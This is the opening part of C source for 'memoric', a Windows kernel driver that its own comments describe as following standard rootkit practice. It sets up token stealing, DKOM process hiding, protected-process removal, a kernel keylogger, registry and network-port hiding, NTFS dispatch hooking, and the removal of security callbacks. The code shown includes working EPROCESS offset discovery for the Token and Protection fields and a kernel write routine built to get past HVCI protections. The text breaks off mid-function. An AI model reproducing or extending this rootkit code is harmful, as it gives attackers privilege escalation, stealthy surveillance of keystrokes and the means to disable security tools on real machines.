/*
 * memoric.c - Memoric kernel driver
 *
 * Custom WDM driver providing kernel-level primitives for memoric:
 *   - Physical memory R/W (MmCopyMemory + MmMapIoSpace)
 *   - Cross-process virtual memory R/W (MmCopyVirtualMemory)
 *   - CR3 retrieval, EPROCESS info, VA-to-PA translation
 *   - Token steal, DKOM hide, PPL remove
 *   - Force kernel write (CR0.WP bypass)
 *
 * Requires: Secure Boot OFF + test signing enabled
 *   bcdedit /set testsigning on
 *
 * Build: See README.md or build.bat
 */

#include <ntifs.h>
#include <ntimage.h>
#include <intrin.h>
#include "memoric.h"

/* Memory type constants not always available in WDK headers */
#ifndef MEM_IMAGE
#define MEM_IMAGE 0x1000000
#endif

/* MEMORY_INFORMATION_CLASS value for mapped file name query */
#ifndef MemoryMappedFilenameInformation
#define MemoryMappedFilenameInformation 2
#endif

/* RtlImageNtHeader is documented but not prototyped in all WDK headers */
NTKERNELAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);

/* ObReferenceObjectByName — undocumented but stable export from ntoskrnl */
NTKERNELAPI NTSTATUS NTAPI ObReferenceObjectByName(
    PUNICODE_STRING ObjectName,
    ULONG Attributes,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID ParseContext,
    PVOID *Object
);
extern POBJECT_TYPE *IoDriverObjectType;

/* KeAlertThread — undocumented ntoskrnl export for waking alertable threads */
NTKERNELAPI BOOLEAN NTAPI KeAlertThread(PKTHREAD Thread, KPROCESSOR_MODE AlertMode);

/* ObSetSecurityObjectByPointer — for device DACL setup */
NTKERNELAPI NTSTATUS NTAPI ObSetSecurityObjectByPointer(
    PVOID Object, SECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR SecurityDescriptor);

/* Suppress deprecation + unreferenced param warnings */
#pragma warning(disable: 4996)
#pragma warning(disable: 4100)
#pragma warning(disable: 4117)

/* ================================================================
 * PE image types (ensure availability for all WDK versions)
 * ================================================================ */
#ifndef IMAGE_FIRST_SECTION
#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)        \
    ((ULONG_PTR)(ntheader) +                                          \
     FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader) +               \
     ((ntheader))->FileHeader.SizeOfOptionalHeader))
#endif

/* ================================================================
 * Module enumeration types (for ZwQuerySystemInformation class 11)
 * ================================================================ */
#ifndef RTL_PROCESS_MODULES_DEFINED
#define RTL_PROCESS_MODULES_DEFINED
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
#endif

/* ================================================================
 * Undocumented kernel API forward declarations
 * ================================================================ */

NTKERNELAPI NTSTATUS NTAPI MmCopyVirtualMemory(
    IN PEPROCESS SourceProcess,
    IN PVOID SourceAddress,
    IN PEPROCESS TargetProcess,
    OUT PVOID TargetAddress,
    IN SIZE_T BufferSize,
    IN KPROCESSOR_MODE PreviousMode,
    OUT PSIZE_T ReturnSize
);

NTKERNELAPI PUCHAR PsGetProcessImageFileName(
    IN PEPROCESS Process
);

NTKERNELAPI PPEB PsGetProcessPeb(
    IN PEPROCESS Process
);

/* ZwQuerySystemInformation and ZwQueryInformationProcess — used extensively */
NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSYSCALLAPI NTSTATUS NTAPI ZwQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

/* SYSTEM_THREAD/PROCESS_INFORMATION for APC thread selection and event log clearing.
 * Defined early because both HandleApcInject (line ~2700) and KernelApcInject use them. */
#ifndef _SYSTEM_PROCESS_INFORMATION_DEFINED
#define _SYSTEM_PROCESS_INFORMATION_DEFINED
typedef struct _SYSTEM_THREAD_INFORMATION_APC {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION_APC;

typedef struct _SYSTEM_PROCESS_INFO_APC {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION_APC Threads[1];
} SYSTEM_PROCESS_INFO_APC, *PSYSTEM_PROCESS_INFO_APC;
#endif

/* IDTR layout for __sidt intrinsic */
#pragma pack(push, 1)
typedef struct _IDTR {
    USHORT Limit;
    ULONG64 Base;
} IDTR;
#pragma pack(pop)

/* ================================================================
 * IOCTL statistics for stability monitoring
 * (declared early so all handlers can reference them)
 * ================================================================ */
static volatile LONG g_IoctlTotal = 0;
static volatile LONG g_IoctlSuccess = 0;
static volatile LONG g_IoctlFailed = 0;
static volatile LONG g_IoctlException = 0;
static volatile LONG g_InFlightIoctls = 0;

#define MEMORIC_CAPABILITY_FLAGS ( \
    MEMORIC_CAP_PHYSICAL_MEMORY | \
    MEMORIC_CAP_VIRTUAL_MEMORY | \
    MEMORIC_CAP_PROCESS_INFO | \
    MEMORIC_CAP_KERNEL_WRITE | \
    MEMORIC_CAP_PROCESS_ENUM | \
    MEMORIC_CAP_CALLBACKS | \
    MEMORIC_CAP_REGISTRY_PROTECT | \
    MEMORIC_CAP_NOTIFICATIONS | \
    MEMORIC_CAP_PROCESS_DUMP | \
    MEMORIC_CAP_HYPERVISOR_DETECT | \
    MEMORIC_CAP_TESTSIGN | \
    MEMORIC_CAP_GLOBAL_HOOKS | \
    MEMORIC_CAP_KERNEL_EXEC | \
    MEMORIC_CAP_DESTRUCTIVE_OPS)

/* ================================================================
 * Driver forward declarations
 * ================================================================ */

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD MemoricUnload;

_Dispatch_type_(IRP_MJ_CREATE)
DRIVER_DISPATCH MemoricCreate;

_Dispatch_type_(IRP_MJ_CLEANUP)
DRIVER_DISPATCH MemoricCleanup;

_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH MemoricClose;

_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH MemoricDeviceControl;

/* ================================================================
 * EPROCESS dynamic offset resolution
 * ================================================================ */

typedef struct _EPROCESS_OFFSETS {
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
    ULONG DirectoryTableBase;
    ULONG Token;
    ULONG ImageFileName;
    ULONG Protection;
    ULONG VadRoot;
    ULONG DebugPort;
    ULONG Flags2;
    ULONG InheritedFromUniqueProcessId;
    ULONG ObjectTable;
    ULONG BuildNumber;
    BOOLEAN Resolved;
} EPROCESS_OFFSETS;

static EPROCESS_OFFSETS g_Offsets = { 0 };
static PDEVICE_OBJECT g_DeviceObject = NULL;
static volatile LONG g_OpenHandles = 0;
static volatile LONG g_Unloading = 0;

/* ================================================================
 * Phase 13 Global State
 * ================================================================ */

/* Keylogger state */
static volatile LONG g_KeyloggerActive = 0;
static USHORT g_KeyBuffer[4096];       /* Circular buffer of VK codes */
static volatile LONG g_KeyBufferHead = 0;
static volatile LONG g_KeyBufferCount = 0;
static PVOID g_GafAsyncKeyState = NULL;
static KTIMER g_KeyloggerTimer;
static KDPC g_KeyloggerDpc;
static UCHAR g_PrevKeyState[64];       /* 256 bits = 32 bytes, using 64 for alignment */

/* Registry hiding */
#define MAX_REG_HIDE_ENTRIES 64
typedef struct _REG_HIDE_ENTRY {
    BOOLEAN InUse;
    ULONG   HideType;             /* 0=key, 1=value */
    WCHAR   KeyPath[256];
    WCHAR   ValueName[128];
} REG_HIDE_ENTRY;
static REG_HIDE_ENTRY g_RegHideEntries[MAX_REG_HIDE_ENTRIES] = { 0 };
static volatile LONG g_RegHideCount = 0;
static LARGE_INTEGER g_RegHideCookie = { 0 };
static BOOLEAN g_RegHideCallbackRegistered = FALSE;

/* File locking */
#define MAX_FILE_LOCK_ENTRIES 64
typedef struct _FILE_LOCK_ENTRY {
    BOOLEAN InUse;
    ULONG   ProtectFlags;
    WCHAR   FilePath[260];
    ULONG   AllowedPid;
} FILE_LOCK_ENTRY;
static FILE_LOCK_ENTRY g_FileLockEntries[MAX_FILE_LOCK_ENTRIES] = { 0 };
static volatile LONG g_FileLockCount = 0;

/* NTFS IRP hook for file lock enforcement */
static PDRIVER_OBJECT g_NtfsDriverObject = NULL;
static PDRIVER_DISPATCH g_OrigNtfsCreate = NULL;
static PDRIVER_DISPATCH g_OrigNtfsSetInfo = NULL;
static BOOLEAN g_FileLockHookInstalled = FALSE;

/* Driver impersonate backup */
static PVOID g_OrigDriverBackup = NULL;
static ULONG g_OrigDriverBackupSize = 0;
static WCHAR g_OrigDriverPath[260] = { 0 };

/* Token duplication restore table */
#define MAX_SAVED_TOKENS 16
static struct {
    BOOLEAN   InUse;
    ULONG     TargetPid;
    ULONG_PTR OriginalFastRef;
} g_SavedTokens[MAX_SAVED_TOKENS] = {0};

/* Phase 14: Port hide entries */
#define MAX_PORT_HIDE_ENTRIES 64
typedef struct _PORT_HIDE_ENTRY {
    BOOLEAN InUse;
    ULONG   Protocol;   /* 6=TCP, 17=UDP */
    USHORT  Port;
    ULONG   Pid;         /* 0=any */
} PORT_HIDE_ENTRY;
static PORT_HIDE_ENTRY g_PortHideEntries[MAX_PORT_HIDE_ENTRIES] = { 0 };
static volatile LONG g_PortHideCount = 0;

/* Phase 14: Saved callback entries for restore */
#define MAX_SAVED_CALLBACKS 64
typedef struct _SAVED_CALLBACK {
    BOOLEAN InUse;
    ULONG   Type;       /* CB_TYPE_* */
    ULONG64 OrigAddr;   /* Original callback address */
    ULONG   ArrayIndex; /* Index in kernel callback array */
} SAVED_CALLBACK;
static SAVED_CALLBACK g_SavedCallbacks[MAX_SAVED_CALLBACKS] = { 0 };
static volatile LONG g_SavedCallbackCount = 0;

/*
 * Dynamically discover critical EPROCESS offsets at load time.
 * Uses documented kernel APIs to locate our own PID/Token/ImageFileName
 * within the current EPROCESS, then verifies with heuristics.
 * Falls back to hardcoded per-build offsets for secondary fields.
 */
static NTSTATUS ResolveEprocessOffsets(void)
{
    RTL_OSVERSIONINFOW osvi = { 0 };
    PEPROCESS current;
    HANDLE currentPid;
    PACCESS_TOKEN token;
    PUCHAR imageName;
    ULONG offset;

    osvi.dwOSVersionInfoSize = sizeof(osvi);
    RtlGetVersion(&osvi);
    g_Offsets.BuildNumber = osvi.dwBuildNumber;

    /* DirectoryTableBase is always at 0x028 on x64 (in KPROCESS header) */
    g_Offsets.DirectoryTableBase = 0x028;

    current = PsGetCurrentProcess();
    currentPid = PsGetCurrentProcessId();

    /* --- Discover UniqueProcessId offset by scanning for our PID --- */
    for (offset = 0x080; offset < 0x900; offset += sizeof(ULONG_PTR)) {
        if (*(PHANDLE)((PUCHAR)current + offset) == currentPid) {
            /* Verify: ActiveProcessLinks should immediately follow (LIST_ENTRY) */
            PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)current + offset + sizeof(ULONG_PTR));
            if ((ULONG_PTR)links->Flink > 0xFFFF000000000000ULL &&
                (ULONG_PTR)links->Blink > 0xFFFF000000000000ULL &&
                links->Flink != links) {
                g_Offsets.UniqueProcessId = offset;
                g_Offsets.ActiveProcessLinks = offset + sizeof(ULONG_PTR);
                DbgPrint("[memoric] Dynamic: UniqueProcessId=0x%X, ActiveProcessLinks=0x%X\n",
                         offset, offset + (ULONG)sizeof(ULONG_PTR));
                break;
            }
        }
    }

    if (g_Offsets.UniqueProcessId == 0) {
        DbgPrint("[memoric] WARNING: Failed to dynamically discover UniqueProcessId\n");
    }

    /* --- Discover Token offset via PsReferencePrimaryToken --- */
    token = PsReferencePrimaryToken(current);
    if (token) {
        for (offset = 0x080; offset < 0x900; offset += sizeof(ULONG_PTR)) {
            ULONG_PTR value = *(PULONG_PTR)((PUCHAR)current + offset);
            /* EX_FAST_REF: low 4 bits are reference count */
            ULONG_PTR tokenAddr = value & ~0xFULL;
            if (tokenAddr == (ULONG_PTR)token) {
                g_Offsets.Token = offset;
                DbgPrint("[memoric] Dynamic: Token=0x%X\n", offset);
                break;
            }
        }
        PsDereferencePrimaryToken(token);
    }

    if (g_Offsets.Token == 0) {
        DbgPrint("[memoric] WARNING: Failed to dynamically discover Token\n");
    }

    /* --- Discover ImageFileName offset via PsGetProcessImageFileName --- */
    imageName = PsGetProcessImageFileName(current);
    if (imageName) {
        for (offset = 0x080; offset < 0xA00; offset++) {
            if ((PUCHAR)current + offset == imageName) {
                g_Offsets.ImageFileName = offset;
                DbgPrint("[memoric] Dynamic: ImageFileName=0x%X (%s)\n", offset, imageName);
                break;
            }
        }
    }

    /* --- Discover InheritedFromUniqueProcessId offset --- */
    /* Find smss.exe (child of System PID 4) and scan its EPROCESS for value 4 */
    if (g_Offsets.UniqueProcessId != 0) {
        ULONG scanStart = g_Offsets.ActiveProcessLinks + (ULONG)sizeof(LIST_ENTRY);
        ULONG scanEnd = g_Offsets.ImageFileName ? g_Offsets.ImageFileName + 0x100 : 0x900;
        ULONG tryPid;

        for (tryPid = 8; tryPid < 2000; tryPid += 4) {
            PEPROCESS findProc = NULL;
            NTSTATUS findSt = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)tryPid, &findProc);
            if (NT_SUCCESS(findSt)) {
                PUCHAR pname = PsGetProcessImageFileName(findProc);
                if (pname && _stricmp((PCHAR)pname, "smss.exe") == 0) {
                    /* smss.exe parent is always System (PID 4) */
                    for (offset = scanStart; offset < scanEnd; offset += sizeof(ULONG_PTR)) {
                        ULONG_PTR val = *(PULONG_PTR)((PUCHAR)findProc + offset);
                        if (val == 4) {
                            g_Offsets.InheritedFromUniqueProcessId = offset;
                            DbgPrint("[memoric] Dynamic: InheritedFromUniqueProcessId=0x%X\n", offset);
                            break;
                        }
                    }
                    ObDereferenceObject(findProc);
                    break;
                }
                ObDereferenceObject(findProc);
            }
        }
    }

    /* --- Discover ObjectTable offset --- */
    /* HANDLE_TABLE has QuotaProcess at +0x10 pointing back to EPROCESS.
     * Scan for a kernel pointer whose target+0x10 == our EPROCESS.
     */
    {
        ULONG scanStart2 = g_Offsets.UniqueProcessId ? g_Offsets.UniqueProcessId + 0x20 : 0x100;
        ULONG scanEnd2 = 0x900;

        for (offset = scanStart2; offset < scanEnd2; offset += sizeof(ULONG_PTR)) {
            __try {
                ULONG_PTR val = *(PULONG_PTR)((PUCHAR)current + offset);
                if (val > 0xFFFF000000000000ULL && val < 0xFFFFFFFFFFFFF000ULL) {
                    /* Check if this is a HANDLE_TABLE: QuotaProcess at +0x10 should point back */
                    ULONG_PTR quotaProc = *(PULONG_PTR)(val + 0x10);
                    if (quotaProc == (ULONG_PTR)current) {
                        /* Double-check: TableCode at +0x08 should be a kernel pointer */
                        ULONG_PTR tableCode = *(PULONG_PTR)(val + 0x08);
                        if ((tableCode & ~3ULL) > 0xFFFF000000000000ULL) {
                            g_Offsets.ObjectTable = offset;
                            DbgPrint("[memoric] Dynamic: ObjectTable=0x%X\n", offset);
                            break;
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
        }
    }

    /* --- Dynamic discovery for Flags2 (EPROCESS.Flags2 / ULONG) ---
     *
     * Flags2 contains NoDebugInherit, HandleTableRundown, etc.
     * Strategy: Flags2 is a ULONG field. For our current process, bit 2
     * (ProcessInsecure=0x02) should be clear. Also, Flags2 is near
     * InheritedFromUniqueProcessId or between Token and ImageFileName.
     * System process (PID 4) and our process should both have non-zero
     * Flags2 values with specific known bits set.
     *
     * We look for a ULONG field that:
     *   - Is non-zero in both our process and System
     *   - Has bit 11 (DisableDynamicCode=0x800) CLEAR in System
     *   - Has bit 0 set (Signaling typically set) in both
     *   - Sits between known fields (after ActiveProcessLinks, before Token)
     */
    if (g_Offsets.Token != 0 && g_Offsets.Flags2 == 0) {
        PEPROCESS sysProc4 = NULL;
        NTSTATUS findSt4 = PsLookupProcessByProcessId((HANDLE)4, &sysProc4);
        if (NT_SUCCESS(findSt4)) {
            ULONG scanStart6 = g_Offsets.ActiveProcessLinks ? g_Offsets.ActiveProcessLinks + 0x10 : 0x100;
            ULONG scanEnd6 = g_Offsets.ImageFileName ? g_Offsets.ImageFileName : 0x800;

            for (offset = scanStart6; offset < scanEnd6; offset += sizeof(ULONG)) {
                __try {
                    ULONG ourVal4 = *(PULONG)((PUCHAR)current + offset);
                    ULONG sysVal4 = *(PULONG)((PUCHAR)sysProc4 + offset);
                    /*
                     * Flags2 heuristic: both should be non-zero DWORDs with
                     * some bits set. Typical System values: 0x00000D00-like.
                     * Typical user process: 0x00000000 or small.
                     * We look for a field where both are small non-zero values
                     * (< 0x100000) and at least one has bit 0 or bit 1 set.
                     */
                    if (ourVal4 != 0 && sysVal4 != 0 &&
                        ourVal4 < 0x100000 && sysVal4 < 0x100000 &&
                        ourVal4 != sysVal4 &&
                        /* Not a pointer (too small) */
                        ourVal4 > 0x100 && sysVal4 > 0x100) {
                        /*
                         * Cross-verify with a third process to ensure consistency.
                         * Look at csrss.exe or another known process.
                         */
                        PEPROCESS csrss = NULL;
                        ULONG tryPid3;
                        BOOLEAN thirdMatch = FALSE;
                        for (tryPid3 = 4; tryPid3 < 800; tryPid3 += 4) {
                            if ((ULONG_PTR)tryPid3 == (ULONG_PTR)currentPid) continue;
                            if (tryPid3 == 4) continue; /* already checked */
                            NTSTATUS fs3 = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)tryPid3, &csrss);
                            if (NT_SUCCESS(fs3)) {
                                ULONG val3 = *(PULONG)((PUCHAR)csrss + offset);
                                ObDereferenceObject(csrss);
                                if (val3 != 0 && val3 < 0x100000 && val3 > 0x100) {
                                    thirdMatch = TRUE;
                                    break;
                                }
                            }
                        }
                        if (thirdMatch) {
                            g_Offsets.Flags2 = offset;
                            DbgPrint("[memoric] Dynamic: Flags2=0x%X (our=0x%X sys=0x%X)\n",
                                     offset, ourVal4, sysVal4);
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
            }
            ObDereferenceObject(sysProc4);
        }
    }

    /*
     * All offsets must be discovered dynamically. No hardcoded fallback table.
     *
     * If any critical offset was NOT discovered, log a clear warning.
     * Callers MUST check each offset != 0 before using it and return
     * STATUS_NOT_SUPPORTED if the needed offset is unavailable.
     * This eliminates the systemic risk of silently using wrong offsets
     * from a build-number table that may be stale or incorrect.
     */
    {
        ULONG missing = 0;
        if (!g_Offsets.UniqueProcessId)    { DbgPrint("[memoric] EPROCESS: UniqueProcessId NOT discovered\n"); missing++; }
        if (!g_Offsets.ActiveProcessLinks) { DbgPrint("[memoric] EPROCESS: ActiveProcessLinks NOT discovered\n"); missing++; }
        if (!g_Offsets.Token)              { DbgPrint("[memoric] EPROCESS: Token NOT discovered\n"); missing++; }
        if (!g_Offsets.ImageFileName)      { DbgPrint("[memoric] EPROCESS: ImageFileName NOT discovered\n"); missing++; }
        if (!g_Offsets.Protection)         { DbgPrint("[memoric] EPROCESS: Protection NOT discovered\n"); missing++; }
        if (!g_Offsets.VadRoot)            { DbgPrint("[memoric] EPROCESS: VadRoot NOT discovered\n"); missing++; }
        if (!g_Offsets.DebugPort)          { DbgPrint("[memoric] EPROCESS: DebugPort NOT discovered\n"); missing++; }
        if (!g_Offsets.Flags2)             { DbgPrint("[memoric] EPROCESS: Flags2 NOT discovered\n"); missing++; }
        if (!g_Offsets.InheritedFromUniqueProcessId) { DbgPrint("[memoric] EPROCESS: InheritedFromUniqueProcessId NOT discovered\n"); missing++; }
        if (!g_Offsets.ObjectTable)        { DbgPrint("[memoric] EPROCESS: ObjectTable NOT discovered\n"); missing++; }

        if (missing > 0) {
            DbgPrint("[memoric] WARNING: %lu EPROCESS field(s) not dynamically discovered (build %lu)\n",
                     missing, osvi.dwBuildNumber);
            DbgPrint("[memoric] WARNING: Features requiring those fields will return STATUS_NOT_SUPPORTED\n");
        }
    }

    /* --- Dynamic discovery for Protection (PS_PROTECTION byte) ---
     *
     * Strategy: Our own process is unprotected (Protection == 0x00).
     * System (PID 4) has Protection != 0 on recent builds.
     * Scan for a byte region near Token that's 0 in our EPROCESS
     * but non-zero in System's EPROCESS.
     *
     * PS_PROTECTION is a single-byte field (Type:3 | Audit:1 | Signer:4).
     * Valid non-zero values: 0x31(Authenticode/Light), 0x41(CodeGen/Light),
     * 0x51(Antimalware/Light), 0x61(Lsa/Light), 0x62(Lsa),
     * 0x71(Windows/Light), 0x72(Windows).
     */
    if (g_Offsets.Token != 0 && g_Offsets.Protection == 0) {
        PEPROCESS sysProc = NULL;
        NTSTATUS findSt = PsLookupProcessByProcessId((HANDLE)4, &sysProc);
        if (NT_SUCCESS(findSt)) {
            ULONG scanStart3 = g_Offsets.Token + 0x40;
            ULONG scanEnd3 = g_Offsets.ImageFileName ? g_Offsets.ImageFileName + 0x200 : 0xA00;
            for (offset = scanStart3; offset < scanEnd3; offset++) {
                __try {
                    UCHAR ourVal = *(PUCHAR)((PUCHAR)current + offset);
                    UCHAR sysVal = *(PUCHAR)((PUCHAR)sysProc + offset);
                    /* Our process should be 0, System should be a valid PS_PROTECTION */
                    if (ourVal == 0 && sysVal != 0 &&
                        (sysVal & 0x07) <= 2 && /* Type: 0=None,1=Light,2=Full */
                        ((sysVal >> 4) & 0x0F) >= 5) { /* Signer >= Antimalware */
                        /* Verify: adjacent bytes shouldn't look like part of a larger integer */
                        UCHAR prev = *(PUCHAR)((PUCHAR)current + offset - 1);
                        UCHAR next = *(PUCHAR)((PUCHAR)current + offset + 1);
                        if (prev == 0 || next == 0) { /* reasonable boundary */
                            g_Offsets.Protection = offset;
                            DbgPrint("[memoric] Dynamic: Protection=0x%X (sys=0x%02X)\n", offset, sysVal);
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
            }
            ObDereferenceObject(sysProc);
        }
    }

    /* --- Dynamic discovery for DebugPort ---
     *
     * DebugPort is a pointer field that's NULL for non-debugged processes.
     * It's typically located between ObjectTable and VadRoot.
     * We use the fact that BOTH our process and System have DebugPort==NULL.
     * We narrow the search by looking for a NULL pointer near known offsets
     * that is consistently NULL across multiple processes.
     */
    if (g_Offsets.ObjectTable != 0 && g_Offsets.DebugPort == 0) {
        /* DebugPort is typically within 0x100 bytes after ObjectTable */
        PEPROCESS sysProc2 = NULL;
        NTSTATUS findSt2 = PsLookupProcessByProcessId((HANDLE)4, &sysProc2);
        if (NT_SUCCESS(findSt2)) {
            ULONG scanStart4 = g_Offsets.ObjectTable - 0x50;
            ULONG scanEnd4 = g_Offsets.ObjectTable + 0x100;

            for (offset = scanStart4; offset < scanEnd4; offset += sizeof(ULONG_PTR)) {
                __try {
                    ULONG_PTR ourVal2 = *(PULONG_PTR)((PUCHAR)current + offset);
                    ULONG_PTR sysVal2 = *(PULONG_PTR)((PUCHAR)sysProc2 + offset);
                    /* Both should be NULL (neither is being debugged) */
                    if (ourVal2 == 0 && sysVal2 == 0) {
                        /* Verify: next pointer should NOT also be zero (avoid zero-padding regions) */
                        ULONG_PTR nextOur = *(PULONG_PTR)((PUCHAR)current + offset + sizeof(ULONG_PTR));
                        ULONG_PTR prevOur = *(PULONG_PTR)((PUCHAR)current + offset - sizeof(ULONG_PTR));
                        if (nextOur != 0 || prevOur != 0) {
                            g_Offsets.DebugPort = offset;
                            DbgPrint("[memoric] Dynamic: DebugPort=0x%X (both NULL)\n", offset);
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
            }
            ObDereferenceObject(sysProc2);
        }
    }

    /* --- Dynamic discovery for VadRoot ---
     *
     * VadRoot is an RTL_AVL_TREE (pointer to root MMVAD node).
     * Every user-mode process has VADs, so our VadRoot should be non-NULL.
     * System process (PID 4) typically has VadRoot==NULL (no user-mode VADs).
     * Scan for a pointer field that's non-NULL in our EPROCESS but NULL in System's.
     * Validate by checking the target looks like a pool allocation (MMVAD node).
     */
    if (g_Offsets.Token != 0 && g_Offsets.VadRoot == 0) {
        PEPROCESS sysProc3 = NULL;
        NTSTATUS findSt3 = PsLookupProcessByProcessId((HANDLE)4, &sysProc3);
        if (NT_SUCCESS(findSt3)) {
            ULONG scanStart5 = g_Offsets.Token + 0x40;
            ULONG scanEnd5 = g_Offsets.ImageFileName ? g_Offsets.ImageFileName : 0xA00;

            for (offset = scanStart5; offset < scanEnd5; offset += sizeof(ULONG_PTR)) {
                __try {
                    ULONG_PTR ourVal3 = *(PULONG_PTR)((PUCHAR)current + offset);
                    ULONG_PTR sysVal3 = *(PULONG_PTR)((PUCHAR)sysProc3 + offset);
                    /* Our process should have VADs, System should not */
                    if (ourVal3 > 0xFFFF000000000000ULL && sysVal3 == 0) {
                        /* Validate: target should be a pool allocation (accessible memory) */
                        ULONG_PTR check = *(PULONG_PTR)(ourVal3);
                        /* Further: the next few pointers at offset should also look like an AVL tree */
                        ULONG_PTR lockVal = *(PULONG_PTR)((PUCHAR)current + offset + sizeof(ULONG_PTR));
                        /* EX_PUSH_LOCK or count field — small value or zero */
                        if (lockVal < 0x10000 || lockVal > 0xFFFF000000000000ULL) {
                            g_Offsets.VadRoot = offset;
                            DbgPrint("[memoric] Dynamic: VadRoot=0x%X (our=%p, sys=0)\n",
                                     offset, (PVOID)ourVal3);
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
            }
            ObDereferenceObject(sysProc3);
        }
    }

    /* All offset discovery is dynamic past this point */

    g_Offsets.Resolved = TRUE;
    DbgPrint("[memoric] EPROCESS offsets resolved for build %lu:\n", osvi.dwBuildNumber);
    DbgPrint("[memoric]   PID=0x%X APL=0x%X DTB=0x%X Token=0x%X\n",
             g_Offsets.UniqueProcessId, g_Offsets.ActiveProcessLinks,
             g_Offsets.DirectoryTableBase, g_Offsets.Token);
    DbgPrint("[memoric]   Protection=0x%X VadRoot=0x%X ImageFileName=0x%X\n",
             g_Offsets.Protection, g_Offsets.VadRoot, g_Offsets.ImageFileName);
    DbgPrint("[memoric]   DebugPort=0x%X Flags2=0x%X InheritedPPID=0x%X\n",
             g_Offsets.DebugPort, g_Offsets.Flags2,
             g_Offsets.InheritedFromUniqueProcessId);

    return STATUS_SUCCESS;
}

/* ================================================================
 * Hyper-V Safe Kernel Write (replaces CR0.WP bypass)
 *
 * On VBS/HVCI systems, clearing CR0.WP from VMX non-root causes
 * a BSOD (KERNEL_SECURITY_CHECK_FAILURE). Instead, we translate
 * the target VA to a physical address and use MmMapIoSpace to
 * create a new writeable PTE mapping.
 *
 * Reference: Standard rootkit practice for HVCI-compatible patching.
 * ================================================================ */

static NTSTATUS SafeKernelWrite(PVOID TargetAddr, PVOID SourceData, SIZE_T Size)
{
    PHYSICAL_ADDRESS physAddr;
    PVOID mapped;

    if (!TargetAddr || !SourceData || Size == 0 || Size > PAGE_SIZE)
        return STATUS_INVALID_PARAMETER;

    /* Handle writes that cross page boundaries */
    if (((ULONG_PTR)TargetAddr & (PAGE_SIZE - 1)) + Size > PAGE_SIZE) {
        /* Split into two writes */
        SIZE_T firstPart = PAGE_SIZE - ((ULONG_PTR)TargetAddr & (PAGE_SIZE - 1));
        NTSTATUS st = SafeKernelWrite(TargetAddr, SourceData, firstPart);
        if (!NT_SUCCESS(st)) return st;
        return SafeKernelWrite(
            (PUCHAR)TargetAddr + firstPart,
            (PUCHAR)SourceData + firstPart,
            Size - firstPart);
    }

    __try {
        physAddr = MmGetPhysicalAddress(TargetAddr);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_INVALID_ADDRESS;
    }

    if (physAddr.QuadPart == 0)
        return STATUS_INVALID_ADDRESS;

    mapped = MmMapIoSpace(physAddr, Size, MmNonCached);
    if (!mapped)
        return STATUS_INSUFFICIENT_RESOURCES;

    __try {
        RtlCopyMemory(mapped, SourceData, Size);
